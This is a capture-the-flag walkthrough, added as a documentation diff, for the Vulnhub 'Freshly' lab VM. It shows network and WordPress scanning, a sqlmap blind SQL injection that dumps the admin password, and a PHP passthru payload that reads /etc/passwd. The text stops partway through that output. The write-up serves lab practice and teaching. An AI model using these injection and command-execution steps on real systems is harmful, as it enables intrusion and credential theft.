@@ -1,0 +1,1052 @@
+.. include:: /pentest_links.txt
+
+.. _Freshly:
+
+*******
+Freshly
+*******
+
+Setup
+=====
+
+This is to document the meetup's efforts responding to the challenge `Vulnhub TopHatSec: Freshly <https://www.vulnhub.com/entry/tophatsec-freshly,118/>`_:
+
+  The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file.
+
+  VulnHub note: You may have issues when importing to VMware. If this is the case. extract the HDD from the OVA file (using something like 7zip), and attach to a new VM. Please see the following guide: https://jkad.github.io/blog/2015/04/12/how-to-import-the-top-hat-sec-vms-into-vmware/. 
+
+Setting up the VMware VM
+------------------------
+
+The VM comes packaged as `Freshly.ova <http://download.vulnhub.com/tophatsec/Freshly.ova>`_, which is a tar archive containing a VMware vmdk file.
+
+See :ref:`VMSetup` for background on using the VMware vmdk file. Freshly is Ubuntu 14.04, x86, and 1024MB memory. For KVM you can use a backing store to undo any changes to the disk:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  VM=Freshly
+  BACKING=$VM-disk1.vmdk
+  VM_DISK=$VM-changes.qcow2
+  curl --remote-name http://download.vulnhub.com/tophatsec/Freshly.ova
+  tar -xvf Freshly.ova
+  $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+  $SUDO qemu-img info $BACKING
+  $SUDO qemu-img info $VM_DISK
+  # To revert to original image
+  # $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+
+Then Linux KVM could use the VM_DISK to create the Freshly VM. The actual command the author used in Debian Linux to create the VM was (os-variant=ubuntutrusty was not supported on Debian Jessie at this time):
+
+.. code-block:: bash
+
+  VM=Freshly
+  $SUDO virt-install \
+      --name "$VM" --cpu host --vcpus 1 --ram 1024 \
+      --os-type=linux --os-variant=ubuntuprecise \
+      --disk path=$VM_DISK \
+      --noautoconsole \
+      --accelerate --hvm \
+      --import
+  #    --console pty,target_type=virtio \
+  # Useful commands:
+  # $SUDO virsh help
+  # $SUDO virsh list --all
+  # $SUDO virsh destroy --graceful $VM
+  # $SUDO virsh start $VM
+  # $SUDO virsh reboot $VM
+  # $SUDO virsh shutdown $VM
+  # $SUDO virsh undefine [--wipe-storage] $VM
+  # $SUDO virsh undefine $VM
+  # $SUDO virsh help destroy
+  # 
+
+So if Freshly were running and you wanted to "start over again":
+
+.. code-block:: bash
+
+  $SUDO virsh shutdown $VM
+  $SUDO virsh undefine $VM
+  $SUDO qemu-img create -f qcow2 -o backing_file=$BACKING  $VM_DISK
+  $SUDO virt-install \
+      --name "Freshly" --cpu host --vcpus 1 --ram 512 \
+      --os-type=linux --os-variant=ubuntuprecise \
+      --disk path=$VM_DISK \
+      --noautoconsole \
+      --accelerate --hvm \
+      --import
+
+
+
+
+Reconnaisance
+=============
+
+Directory setup
+---------------
+
+We'll refer to the following directories below:
+
+.. code-block:: bash
+
+  BASE=$HOME/local/pentest
+  LOCATION=$BASE/phouse
+  JOB=$LOCATION/freshly
+  TOOLS=exploit,dirb,hashcat,nikto,nmap,skipfish,sqlmap,wpscan
+  eval mkdir -p $JOB/{$TOOLS}
+
+
+
+Basic network reconnaisance
+---------------------------
+
+Start with some standard network reconnaisance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  SUDO=$(which sudo)
+  [[ "$USER" == "root" ]] && SUDO=
+  cd $JOB/nmap
+  NMOUT=nmap-phouse
+  SN='192.168.1.0/24'
+  TARGETS=targets.txt
+  nmap -sn -PE -oA ${NMOUT}_sn $SN
+  # use the grep-able output to get a list of target hosts
+  grep Up ${NMOUT}_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc ${NMOUT}_sn.xml -o ${NMOUT}_sn.html
+
+Running this gives us:
+
+.. code-block:: console
+
+  hacker@kali:~/local/pentest/phouse/freshly/nmap$ nmap -sn -PE -oA ${NMOUT}_sn $SN
+  Warning:  You are not root -- using TCP pingscan rather than ICMP
+
+  Starting Nmap 6.47 ( http://nmap.org ) at 2015-05-02 16:01 PDT
+  Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 256 undergoing Ping Scan
+  Ping Scan Timing: About 2.15% done; ETC: 16:02 (0:00:46 remaining)
+  ###################### SNIP ######################
+  Nmap scan report for 192.168.1.103
+  Host is up (0.00029s latency).
+  ###################### SNIP ######################
+  Nmap done: 256 IP addresses (6 hosts up) scanned in 1.24 seconds
+  hacker@kali:~/local/pentest/phouse/freshly/nmap$ # use the grep-able output to get a list of target hosts
+  hacker@kali:~/local/pentest/phouse/freshly/nmap$ grep Up ${NMOUT}_sn.gnmap | cut -d" " -f2 > $TARGETS
+  hacker@kali:~/local/pentest/phouse/freshly/nmap$ # use the xml output to get an html report
+  hacker@kali:~/local/pentest/phouse/freshly/nmap$ xsltproc ${NMOUT}_sn.xml -o ${NMOUT}_sn.html
+
+At this point we have $TARGETS so scan them:
+
+.. code-block:: bash
+
+  nmap -A -vv -T5 --max-retries 0 -Pn -iL $TARGETS -oA ${NMOUT}_A
+  xsltproc ${NMOUT}_A.xml -o ${NMOUT}_A.html
+
+Running this gives us:
+
+.. code-block:: console
+  :emphasize-lines: 3,5,7,15,18,42
+
+  hacker@kali:~/local/pentest/phouse/freshly/nmap$ nmap -A -vv -T5 --max-retries 0 -Pn -iL $TARGETS -oA ${NMOUT}_A
+  ###################### SNIP ######################
+  Discovered open port 8080/tcp on 192.168.1.103
+  ###################### SNIP ######################
+  Discovered open port 80/tcp on 192.168.1.103
+  ###################### SNIP ######################
+  Discovered open port 443/tcp on 192.168.1.103
+  ###################### SNIP ######################
+  ###################### SNIP ######################
+  Nmap scan report for 192.168.1.103
+  Host is up (0.00043s latency).
+  Scanned at 2015-05-02 16:03:42 PDT for 70s
+  Not shown: 997 closed ports
+  PORT     STATE SERVICE  VERSION
+  80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))
+  |_http-methods: GET HEAD POST OPTIONS
+  |_http-title: Site doesn't have a title (text/html).
+  443/tcp  open  ssl/http Apache httpd
+  |_http-favicon: Unknown favicon MD5: A8B5AD142FFA4621B3DBF67BDECA483A
+  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+  |_http-title: Site doesn't have a title (text/html).
+  | ssl-cert: Subject: commonName=www.example.com
+  | Issuer: commonName=www.example.com
+  | Public Key type: rsa
+  | Public Key bits: 1024
+  | Not valid before: 2015-02-17T03:30:05+00:00
+  | Not valid after:  2025-02-14T03:30:05+00:00
+  | MD5:   ebd4 a980 6e51 1b13 769e d4b1 28f9 71dd
+  | SHA-1: 6297 03e9 f83b 06e7 d50d 3f4b 5bae 38c9 7665 cc64
+  | -----BEGIN CERTIFICATE-----
+  | MIIBqzCCARQCCQDg5heFLm8t8jANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
+  | d3cuZXhhbXBsZS5jb20wHhcNMTUwMjE3MDMzMDA1WhcNMjUwMjE0MDMzMDA1WjAa
+  | MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
+  | MIGJAoGBANFjfgmsBCGKWfdqCYZnY2mKvtUnYFtenVjtqdReduE12yavSQZuWAi2
+  | jIpCUMwG7RG3QAwyzCoMWAzF/tZimI8uNL8G9m84l/wQAbTPMPJTgJXpwY0/9IRc
+  | hdqtpFoVS251qA9AvPeqMv/hV+rKVAkYcONB6Q8Or8S6ifkEBAZbAgMBAAEwDQYJ
+  | KoZIhvcNAQEFBQADgYEAQ3Kt0nVDLMkAv9/k1bt6KaM06cvTtiekgu0ugxA0TNXC
+  | FNIBqu/Fasog43FRLuUtAtNCNMqI5QAAVPatQPk1QmVoE+IxbvxldrKykZk9oXkj
+  | 5rbE43BAkxyiMvuNsZh7W2Lzx14tlA84c8B4Y1S0CqoVLpaJaCQ5MtVMSya3wAM=
+  |_-----END CERTIFICATE-----
+  |_ssl-date: 2057-02-26T05:39:31+00:00; +41y299d6h34m41s from local time.
+  8080/tcp open  http     Apache httpd
+  |_http-favicon: Unknown favicon MD5: A8B5AD142FFA4621B3DBF67BDECA483A
+  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+  |_http-title: Site doesn't have a title (text/html).
+  ###################### SNIP ######################
+  hacker@kali:~/local/pentest/phouse/freshly/nmap$ xsltproc ${NMOUT}_A.xml -o ${NMOUT}_A.html
+
+Our target freshly is T=192.168.1.103 and runs a web server at ports 80, 443, and 8080.
+
+.. code-block:: bash
+
+  T=192.168.1.103
+
+What's at ports 80, 443, 8080?
+------------------------------
+
+.. code-block:: bash
+
+  T=192.168.1.103
+  cd $JOB/exploit
+  curl --output freshly_80.txt http://$T/
+  cat freshly_80.txt
+  curl --insecure --output freshly_443.txt https://$T/
+  cat freshly_443.txt
+  curl --output freshly_8080.txt http://$T:8080/
+  cat freshly_8080.txt
+
+When looking at the resulting content we see port 80 shows an image while 443 & 8080 provide links to http://$T:8080/wordpress/ which is a wordpress-based site.
+
+
+:program:`wpscan`
+-----------------
+
+Using the wordpress hint we run the :program:`wpscan` tool. It turns out not to be needed for the exploit so if you're in a rush skip this section.
+
+.. code-block:: bash
+
+  cd $JOB/wpscan
+  $SUDO apt-get install wpscan -y
+  $SUDO wpscan --url http://$T:8080/wordpress/ --random-agent \
+     --enumerate u,vp,vt,tt 2>&1 | tee wpscan.txt
+
+The wpscan output gives us:
+
+.. code-block:: console
+  :emphasize-lines: 1-2,24-25,27,35,139,162,165-170
+
+  hacker@kali:~/local/pentest/phouse/freshly/wpscan$ $SUDO wpscan --url http://$T:8080/wordpress/ --random-agent \
+  >    --enumerate u,vp,vt,tt 2>&1 | tee wpscan.txt
+  _______________________________________________________________
+          __          _______   _____                  
+          \ \        / /  __ \ / ____|                 
+           \ \  /\  / /| |__) | (___   ___  __ _ _ __  
+            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+             \  /\  /  | |     ____) | (__| (_| | | | |
+              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+          WordPress Security Scanner by the WPScan Team 
+                         Version 2.7
+            Sponsored by Sucuri - https://sucuri.net
+     @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
+  _______________________________________________________________
+
+  [+] URL: http://192.168.1.103:8080/wordpress/
+  [+] Started: Tue May 12 23:10:27 2015
+
+  [!] The WordPress 'http://192.168.1.103:8080/wordpress/readme.html' file exists exposing a version number
+  [!] Full Path Disclosure (FPD) in: 'http://192.168.1.103:8080/wordpress/wp-includes/rss-functions.php'
+  [+] Interesting header: SERVER: Apache
+  [+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
+  [+] XML-RPC Interface available under: http://192.168.1.103:8080/wordpress/xmlrpc.php
+  [i] This may allow the GHOST vulnerability to be exploited, please see: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+
+  [+] WordPress version 4.1.5 identified from meta generator
+
+  [+] Enumerating installed plugins (only vulnerable ones) ...
+
+
+
+    : |==========================================================================|
+
+  [+] We found 7 plugins:
+
+  [+] Name: all-in-one-seo-pack - v2.2.5.1
+   |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/
+   |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/all-in-one-seo-pack/readme.txt
+
+  [!] Title: All in One SEO Pack <= 2.2.5.1 - Authentication Bypass
+      Reference: https://wpvulndb.com/vulnerabilities/7881
+      Reference: http://jvn.jp/en/jp/JVN75615300/index.html
+      Reference: http://semperfiwebdesign.com/blog/all-in-one-seo-pack/all-in-one-seo-pack-release-history/
+      Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0902
+  [i] Fixed in: 2.2.6
+
+  [+] Name: all-in-one-wp-migration - v2.0.4
+   |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/all-in-one-wp-migration/
+   |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/all-in-one-wp-migration/readme.txt
+
+  [!] Title: All-in-One WP Migration <= 2.0.4 - Unauthenticated Database Export
+      Reference: https://wpvulndb.com/vulnerabilities/7857
+      Reference: http://www.pritect.net/blog/all-in-one-wp-migration-2-0-4-security-vulnerability
+  [i] Fixed in: 2.0.5
+
+  [+] Name: cart66-lite - v1.5.3
+   |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/cart66-lite/
+   |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt
+
+  [!] Title: Cart66 Lite <= 1.5.3 - SQL Injection
+      Reference: https://wpvulndb.com/vulnerabilities/7737
+      Reference: https://research.g0blin.co.uk/g0blin-00022/
+      Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
+  [i] Fixed in: 1.5.4
+
+  [+] Name: google-analytics-for-wordpress - v5.3.1
+   |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/
+   |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/readme.txt
+
+  [!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)
+      Reference: https://wpvulndb.com/vulnerabilities/7838
+      Reference: http://packetstormsecurity.com/files/130716/
+      Reference: http://osvdb.org/119334
+  [i] Fixed in: 5.3.3
+
+  [!] Title: Google Analytics by Yoast <= 5.3.2 - Stored Cross-Site Scripting (XSS)
+      Reference: https://wpvulndb.com/vulnerabilities/7856
+      Reference: https://yoast.com/ga-plugin-security-update-more/
+      Reference: http://klikki.fi/adv/yoast_analytics.html
+      Reference: http://packetstormsecurity.com/files/130935/
+      Reference: http://osvdb.org/119810
+  [i] Fixed in: 5.3.3
+
+  [!] Title: Google Analytics by Yoast <= 5.3.3 - Cross-Site Scripting (XSS)
+      Reference: https://wpvulndb.com/vulnerabilities/7914
+      Reference: https://yoast.com/coordinated-security-release/
+      Reference: https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html
+      Reference: http://klikki.fi/adv/yoast_analytics2.html
+      Reference: http://osvdb.org/121068
+  [i] Fixed in: 5.4
+
+  [+] Name: jetpack - v3.3.1
+   |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/jetpack/
+   |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/jetpack/readme.txt
+
+  [!] Title: Jetpack by WordPress.com 3.0-3.4.2 - Cross-Site Scripting (XSS)
+      Reference: https://wpvulndb.com/vulnerabilities/7915
+      Reference: https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html
+      Reference: https://jetpack.me/2015/04/20/jetpack-3-4-3-coordinated-security-update/
+      Reference: http://osvdb.org/121066
+  [i] Fixed in: 3.4.3
+
+  [!] Title: Jetpack <= 3.5.2 - DOM Cross-Site Scripting (XSS)
+      Reference: https://wpvulndb.com/vulnerabilities/7964
+      Reference: https://blog.sucuri.net/2015/05/jetpack-and-twentyfifteen-vulnerable-to-dom-based-xss-millions-of-wordpress-websites-affected-millions-of-wordpress-websites-affected.html
+  [i] Fixed in: 3.5.3
+
+  [+] Name: proplayer - v4.7.9.1
+   |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/proplayer/
+   |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/proplayer/readme.txt
+
+  [!] Title: ProPlayer 4.7.9.1 - SQL Injection
+      Reference: https://wpvulndb.com/vulnerabilities/6912
+      Reference: http://osvdb.org/93564
+      Reference: http://www.exploit-db.com/exploits/25605/
+
+  [+] Name: wptouch - v3.6.6
+   |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/wptouch/
+   |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/wptouch/readme.txt
+
+  [!] Title: WPtouch <= 3.6.6 - Unvalidated Open Redirect
+      Reference: https://wpvulndb.com/vulnerabilities/7837
+      Reference: https://wordpress.org/plugins/wptouch/changelog/
+  [i] Fixed in: 3.7
+
+  [!] Title: WPtouch Mobile Plugin <= 3.7.5.3 - Cross-Site Scripting (XSS)
+      Reference: https://wpvulndb.com/vulnerabilities/7920
+      Reference: https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html
+      Reference: http://osvdb.org/121073
+  [i] Fixed in: 3.7.6
+
+  [+] Enumerating installed themes (only vulnerable ones) ...
+
+
+
+    : |==========================================================================|
+
+  [+] We found 1 themes:
+
+  [+] Name: twentyfifteen - v1.0
+   |  Location: http://192.168.1.103:8080/wordpress/wp-content/themes/twentyfifteen/
+   |  Readme: http://192.168.1.103:8080/wordpress/wp-content/themes/twentyfifteen/readme.txt
+   |  Style URL: http://192.168.1.103:8080/wordpress/wp-content/themes/twentyfifteen/style.css
+   |  Theme Name: Twenty Fifteen
+   |  Theme URI: https://wordpress.org/themes/twentyfifteen
+   |  Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple,...
+   |  Author: the WordPress team
+   |  Author URI: https://wordpress.org/
+
+  [!] Title: Twenty Fifteen Theme <= 1.1 - DOM Cross-Site Scripting (XSS)
+      Reference: https://wpvulndb.com/vulnerabilities/7965
+      Reference: https://blog.sucuri.net/2015/05/jetpack-and-twentyfifteen-vulnerable-to-dom-based-xss-millions-of-wordpress-websites-affected-millions-of-wordpress-websites-affected.html
+  [i] Fixed in: 1.2
+
+  [+] Enumerating timthumb files ...
+
+
+
+    : |==========================================================================|
+
+  [+] No timthumb files found
+
+  [+] Enumerating usernames ...
+  [+] Identified the following 1 user/s:
+      +----+-------+-------+
+      | Id | Login | Name  |
+      +----+-------+-------+
+      | 1  | admin | admin |
+      +----+-------+-------+
+  [!] Default first WordPress username 'admin' is still used
+
+  [+] Finished: Tue May 12 23:16:49 2015
+  [+] Requests Done: 3989
+  [+] Memory used: 14.184 MB
+  [+] Elapsed time: 00:06:22
+
+None of the exploits appeared to be an easy, relevant source of exploit.
+
+Spidering the web site
+----------------------
+
+Next we look for any non-navigable web site files/directories. These tools exist on Kali Linux and could be used: GUI :program:`owasp-zap`, command line :program:`dirb`, command line :program:`skipfish` with html output, and command line :program:`nikto`. Here are runs of :program:`dirb`, :program:`skipfish`, and :program:`nikto`. We stop at looking at http://$T/ and don't recurse due to finding :file:`login.php` quickly.
+
+:program:`dirb`
+^^^^^^^^^^^^^^^
+
+.. code-block:: bash
+
+  cd $JOB/dirb
+  dirb  http://$T/ -o dirb_html_php -X ".html,.php"
+
+Running this gives us:
+
+.. code-block:: console
+  :emphasize-lines: 1,10-12,20
+
+  hacker@kali:~/local/pentest/phouse/freshly/dirb$ dirb  http://$T/ -o dirb_html_php -X ".html,.php"
+
+  -----------------
+  DIRB v2.21    
+  By The Dark Raver
+  -----------------
+
+  OUTPUT_FILE: dirb_html_php
+  START_TIME: Mon May  4 13:22:29 2015
+  URL_BASE: http://192.168.1.103/
+  WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+  EXTENSIONS_LIST: (.html,.php) | (.html)(.php) [NUM = 2]
+
+  -----------------
+
+  GENERATED WORDS: 4592                                                          
+
+  ---- Scanning URL: http://192.168.1.103/ ----
+  + http://192.168.1.103/index.html (CODE:200|SIZE:47)                           
+  + http://192.168.1.103/login.php (CODE:200|SIZE:276)                           
+                                                                                 
+  -----------------
+  DOWNLOADED: 9184 - FOUND: 2
+
+:program:`skipfish`
+^^^^^^^^^^^^^^^^^^^
+Trying :program:`skipfish` took more work to speed it up (to exclude some subdirectories). To see what it's scanning hit the space bar while it runs:
+
+.. code-block:: bash
+
+  cd $JOB/skipfish
+  MINIMAL=/usr/share/skipfish/dictionaries/minimal.wl
+  EXT=/usr/share/skipfish/dictionaries/extensions-only.wl
+  DICT="-S $MINIMAL -S $EXT"
+  SKIP="-X /phpmyadmin -X /icons -X /javascript"
+  REPORT=skipfish_minimal
+  rm -rf $REPORT
+  skipfish $SKIP $DICT -L -o skipfish_minimal http://$T
+
+Running this produces an html report accessible from :file:`skipfish_minimal/index.html` (showing :file:`login.php`).
+
+:program:`nikto`
+^^^^^^^^^^^^^^^^
+
+.. code-block:: bash
+
+  T=192.168.1.103
+  nikto -output nikto_80.txt -host $T
+  nikto -output nikto_8080.txt -host $T -port 8080
+  nikto -output nikto_443.txt -host $T -port 443
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 1,4-6,9,19-20,25,28-30,43,48,51-53,74
+
+  hacker@kali:~/local/pentest/phouse/freshly/nikto$ nikto -output nikto_80.txt -host $T
+  - Nikto v2.1.6
+  ---------------------------------------------------------------------------
+  + Target IP:          192.168.1.103
+  + Target Hostname:    192.168.1.103
+  + Target Port:        80
+  + Start Time:         2015-05-04 22:02:45 (GMT-7)
+  ---------------------------------------------------------------------------
+  + Server: Apache/2.4.7 (Ubuntu)
+  + Server leaks inodes via ETags, header found with file /, fields: 0x2f 0x50f4228b8016c 
+  + The anti-clickjacking X-Frame-Options header is not present.
+  + No CGI Directories found (use '-C all' to force check all possible dirs)
+  + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+  + Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.5
+  + Uncommon header 'x-webkit-csp' found, with contents: default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data:  *.tile.openstreetmap.org *.tile.opencyclemap.org;
+  + Uncommon header 'x-ob_mode' found, with contents: 0
+  + Uncommon header 'x-content-security-policy' found, with contents: default-src 'self' ;options inline-script eval-script;img-src 'self' data:  *.tile.openstreetmap.org *.tile.opencyclemap.org;
+  + OSVDB-3233: /icons/README: Apache default file found.
+  + /login.php: Admin login page/section found.
+  + /phpmyadmin/: phpMyAdmin directory found
+  + 6744 requests: 0 error(s) and 10 item(s) reported on remote host
+  + End Time:           2015-05-04 22:03:02 (GMT-7) (17 seconds)
+  ---------------------------------------------------------------------------
+  + 1 host(s) tested
+  hacker@kali:~/local/pentest/phouse/freshly/nikto$ nikto -output nikto_8080.txt -host $T -port 8080
+  - Nikto v2.1.6
+  ---------------------------------------------------------------------------
+  + Target IP:          192.168.1.103
+  + Target Hostname:    192.168.1.103
+  + Target Port:        8080
+  + Start Time:         2015-05-04 22:03:11 (GMT-7)
+  ---------------------------------------------------------------------------
+  + Server: Apache
+  + IP address found in the 'x-mod-pagespeed' header. The IP is "1.7.30.4".
+  + Uncommon header 'x-mod-pagespeed' found, with contents: 1.7.30.4-
+  + No CGI Directories found (use '-C all' to force check all possible dirs)
+  + Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0x47e 0x4fbf4f262dd00 
+  + OSVDB-3268: /img/: Directory indexing found.
+  + OSVDB-3092: /img/: This might be interesting...
+  + Cookie PHPSESSID created without the httponly flag
+  + Retrieved x-powered-by header: PHP/5.4.35
+  + Uncommon header 'link' found, with contents: <http://192.168.1.103:8080/wordpress/>; rel=shortlink
+  + /wordpress/: A Wordpress installation was found.
+  + 6606 requests: 0 error(s) and 9 item(s) reported on remote host
+  + End Time:           2015-05-04 22:03:30 (GMT-7) (19 seconds)
+  ---------------------------------------------------------------------------
+  + 1 host(s) tested
+  hacker@kali:~/local/pentest/phouse/freshly/nikto$ nikto -output nikto_443.txt -host $T -port 443
+  - Nikto v2.1.6
+  ---------------------------------------------------------------------------
+  + Target IP:          192.168.1.103
+  + Target Hostname:    192.168.1.103
+  + Target Port:        443
+  ---------------------------------------------------------------------------
+  + SSL Info:        Subject: /CN=www.example.com
+                     Ciphers: ECDHE-RSA-AES256-GCM-SHA384
+                     Issuer:  /CN=www.example.com
+  + Start Time:         2015-05-04 22:03:36 (GMT-7)
+  ---------------------------------------------------------------------------
+  + Server: Apache
+  + IP address found in the 'x-mod-pagespeed' header. The IP is "1.7.30.4".
+  + Uncommon header 'x-mod-pagespeed' found, with contents: 1.7.30.4-
+  + The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+  + No CGI Directories found (use '-C all' to force check all possible dirs)
+  + Hostname '192.168.1.103' does not match certificate's CN 'www.example.com'
+  + Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0x47e 0x4fbf4f262dd00 
+  + OSVDB-3268: /img/: Directory indexing found.
+  + OSVDB-3092: /img/: This might be interesting...
+  + Cookie PHPSESSID created without the secure flag
+  + Cookie PHPSESSID created without the httponly flag
+  + Cookie Cart66DBSID created without the secure flag
+  + Retrieved x-powered-by header: PHP/5.4.35
+  + Uncommon header 'link' found, with contents: <https://192.168.1.103:443/wordpress/>; rel=shortlink
+  + /wordpress/: A Wordpress installation was found.
+  + 6604 requests: 0 error(s) and 13 item(s) reported on remote host
+  + End Time:           2015-05-04 22:05:10 (GMT-7) (94 seconds)
+  ---------------------------------------------------------------------------
+  + 1 host(s) tested
+
+In summary
+^^^^^^^^^^
+
+All these reports show a login form at http://$T/login.php which we will subject to :program:`sqlmap` analysis.
+
+:program:`sqlmap` :file:`login.php`
+-----------------------------------
+
+Looking at the login.php form shows user/password fields which we feed into sqlmap:
+
+.. code-block:: console
+  :emphasize-lines: 1-3,9,13,16
+
+  hacker@kali:~/local/pentest/phouse/freshly/sqlmap$ cd $JOB/sqlmap
+  hacker@kali:~/local/pentest/phouse/freshly/sqlmap$ curl --silent --remote-name http://$T/login.php
+  hacker@kali:~/local/pentest/phouse/freshly/sqlmap$ cat login.php
+
+  <form action="" method="post">
+  <table width="50%">
+	  <tr>
+		  <td>User</td>
+		  <td><input type="text" name="user"></td>
+	  </tr>
+	  <tr>
+		  <td>Password</td>
+		  <td><input type="password" name="password"></td>
+	  </tr>
+	  </table>
+		  <input type="submit" value="Submit" name="s">
+	  </form>
+
+Start with "--dbs" to find if sql injection is possible the databases, then progress to enumerating user accounts for wordpress. It's quite slow due to being a blink sql injection.
+
+.. code-block:: bash
+
+  T=192.168.1.103
+  URL=http://$T/login.php
+  sqlmap -u "$URL" --random-agent --forms --batch \
+      --output-dir $PWD/sqlmap_login --dbs
+
+Running this gives us:
+
+.. code-block:: console
+  :emphasize-lines: 3-4,6,14,16-23
+
+  hacker@kali:~/local/pentest/phouse/freshly/sqlmap$ T=192.168.1.103
+  hacker@kali:~/local/pentest/phouse/freshly/sqlmap$ URL=http://$T/login.php
+  hacker@kali:~/local/pentest/phouse/freshly/sqlmap$ sqlmap -u "$URL" --random-agent --forms --batch \
+      --output-dir $PWD/sqlmap_login --dbs
+  ###################### SNIP ######################
+  sqlmap identified the following injection points with a total of 114 HTTP(s) requests:
+  ---
+  Parameter: user (POST)
+      Type: AND/OR time-based blind
+      Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+      Payload: user=LDRL' AND (SELECT * FROM (SELECT(SLEEP(5)))lPIC) AND 'KrbC'='KrbC&password=&s=Submit
+  ---
+  ###################### SNIP ######################
+  back-end DBMS: MySQL 5.0.12
+  ###################### SNIP ######################
+  available databases [7]:
+  [*] information_schema
+  [*] login
+  [*] mysql
+  [*] performance_schema
+  [*] phpmyadmin
+  [*] users
+  [*] wordpress8080
+  ###################### SNIP ######################
+
+Let's go after the wordpress8080 MySQL database:
+
+.. code-block:: bash
+
+  sqlmap -u "$URL" --random-agent --forms --batch \
+      --output-dir $PWD/sqlmap_login -D wordpress8080  --tables
+
+Running this shows database wordpress8080 has only a users table:
+
+.. code-block:: console
+  :emphasize-lines: 1,5-9
+
+  hacker@kali:~/local/pentest/phouse/freshly/sqlmap$ sqlmap -u "$URL" --random-agent --forms --batch \
+      --output-dir $PWD/sqlmap_login -D wordpress8080  --tables
+  ###################### SNIP ######################
+
+  Database: wordpress8080
+  [1 table]
+  +-------+
+  | users |
+  +-------+
+  ###################### SNIP ######################
+
+So let's dump the users table:
+
+.. code-block:: bash
+
+  sqlmap -u "$URL" --random-agent --forms --batch \
+      --output-dir $PWD/sqlmap_login -D wordpress8080  -T users --dump
+  
+
+.. code-block:: console
+  :emphasize-lines: 1-2,4-11
+
+  hacker@kali:~/local/pentest/phouse/freshly/sqlmap$ sqlmap -u "$URL" --random-agent --forms --batch \
+      --output-dir $PWD/sqlmap_login -D wordpress8080  -T users --dump
+  ###################### SNIP ######################
+  Database: wordpress8080
+  Table: users
+  [1 entry]
+  +----------+---------------------+
+  | username | password            |
+  +----------+---------------------+
+  | admin    | SuperSecretPassword |
+  +----------+---------------------+
+  ###################### SNIP ######################
+
+So now we can log into the wordpress site http://$T:8080/wordpress/wp-login.php using admin/SuperSecretPassword.
+
+
+The Exploit
+===========
+
+Insert PHP Plugin
+-----------------
+
+One direct way to exploit WordPress is to add & activate the plugin `Insert PHP <https://wordpress.org/plugins/insert-php/>`_ via the http://$T:8080/wordpress/wp-admin/ :menuselection:`Plugins --> Add new --> Upload Plugin --> Browse --> Install now --> Activate Plugin` menu item. Once you have that, :menuselection:`Pages --> Add new` to add a new page with content:
+
+.. code-block:: php
+
+  [insert_php]
+  passthru('id; echo "\n"; cat /etc/passwd;');
+  [/insert_php]
+
+Navigating to the page will give you:
+
+.. code-block:: text
+  :emphasize-lines: 27-28
+
+  uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+  root:x:0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+  bin:x:2:2:bin:/bin:/usr/sbin/nologin
+  sys:x:3:3:sys:/dev:/usr/sbin/nologin
+  sync:x:4:65534:sync:/bin:/bin/sync
+  games:x:5:60:games:/usr/games:/usr/sbin/nologin
+  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
